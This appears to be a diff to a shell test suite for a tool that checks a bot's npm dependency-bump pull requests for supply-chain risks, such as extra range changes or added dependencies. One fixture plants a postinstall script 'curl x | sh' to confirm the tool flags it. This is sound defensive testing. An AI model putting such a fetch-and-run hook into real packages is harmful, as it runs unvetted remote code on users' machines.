@@ -136,8 +136,7 @@ bump() {  # lock-json pkg to [resolved-host] -> lock with that one entry changed
   printf '%s' "$1" | jq -c --arg p "node_modules/$2" --arg t "$3" --arg h "${4:-https://registry.npmjs.org}" \
     '.packages[$p] = {version:$t, resolved:($h + "/x-" + $t + ".tgz"), integrity:("sha512-" + $t)}'
 }
-PKG0='{"name":"app","scripts":{"test":"node t.js"},"dependencies":{"lodash":"^4.17.20"}}'
-PKG1='{"name":"app","scripts":{"test":"node t.js"},"dependencies":{"lodash":"^4.17.21"}}'
+PKG0='{"name":"app","scripts":{"test":"node t.js"},"dependencies":{"lodash":"^4.17.20","left-pad":"^1.0.0","axios":"^1.0.0"}}'
 # dep_ok <slug> <n> <head-sha> <pkg> <to>: a clean bot bump (author, commits, files, lockfile).
 dep_ok() {
   user "$1" "$2" "$BOT" Bot
@@ -146,7 +145,7 @@ dep_ok() {
   raw "$1" package-lock.json "$BASE" "$LOCK0"
   raw "$1" package-lock.json "$3" "$(bump "$LOCK0" "$4" "$5")"
   raw "$1" package.json "$BASE" "$PKG0"
-  raw "$1" package.json "$3" "$PKG1"
+  raw "$1" package.json "$3" "$(printf '%s' "$PKG0" | jq -c --arg p "$4" --arg t "^$5" '.dependencies[$p] = $t')"
 }
 reg() {  # pkg from to published-epoch pub_from pub_to new-postinstall?
   local scripts='{}'; [ "${7:-}" = 1 ] && scripts='{"postinstall":"node x.js"}'
@@ -265,7 +264,14 @@ raw acme/one package-lock.json "$(sha 3001)" "$(bump "$LOCK0" lodash 4.17.21 htt
 O="$(t1)"; check "package resolved from another host -> flags" "printf '%s' \"\$O\" | grep -q 'does not resolve from the npm registry'"
 reset_one
 raw acme/one package.json "$(sha 3001)" '{"name":"app","scripts":{"test":"node t.js","postinstall":"curl x | sh"},"dependencies":{"lodash":"^4.17.21"}}'
-O="$(t1)"; check "package.json gains a script -> flags" "printf '%s' \"\$O\" | grep -q 'package.json changes more than dependency ranges'"
+O="$(t1)"; check "package.json gains a script -> flags" "printf '%s' \"\$O\" | grep -q 'package.json changes more than the bumped package range'"
+raw acme/one package.json "$BASE" '{"name":"app","dependencies":{"lodash":"^4.17.20","axios":"^1.0.0"},"devDependencies":{"left-pad":"^1.0.0"}}'
+raw acme/one package.json "$(sha 3001)" '{"name":"app","dependencies":{"lodash":"^4.17.21","axios":"^9.0.0"},"devDependencies":{"left-pad":"^1.0.0"}}'
+O="$(t1)"; check "R1: a second package's range changes -> decision, never a candidate" "row \"\$O\" acme/one#1 | grep -q 'NEEDS FIX — supply-chain flags' && printf '%s' \"\$O\" | grep -q 'changes more than the bumped package range' && printf '%s' \"\$O\" | grep -q 'Review supply-chain flags on acme/one#1?'"
+raw acme/one package.json "$(sha 3001)" '{"name":"app","dependencies":{"lodash":"^4.17.21","axios":"^1.0.0"},"devDependencies":{"left-pad":"^1.0.0","evil":"^1.0.0"}}'
+O="$(t1)"; check "R1: a new dependency added beside the bump -> never a candidate" "! row \"\$O\" acme/one#1 | grep -q CANDIDATE && printf '%s' \"\$O\" | grep -q 'changes more than the bumped package range'"
+raw acme/one package.json "$(sha 3001)" '{"name":"app","dependencies":{"lodash":"^4.17.21","axios":"^1.0.0"},"devDependencies":{"left-pad":"^1.0.0"}}'
+O="$(t1)"; check "R1: only the bumped package's range changes -> candidate" "row \"\$O\" acme/one#1 | grep -q 'AUTO-MERGE CANDIDATE'"
 reset_one
 commits acme/one 1 "[$BOTCOMMIT,{\"author\":{\"id\":4242,\"type\":\"User\"},\"commit\":{\"verification\":{\"verified\":true}}}]"
 O="$(t1)"; check "extra commit by a person on the bot branch -> flags" "row \"\$O\" acme/one#1 | grep -q 'NEEDS FIX' && printf '%s' \"\$O\" | grep -q 'commits: fail'"
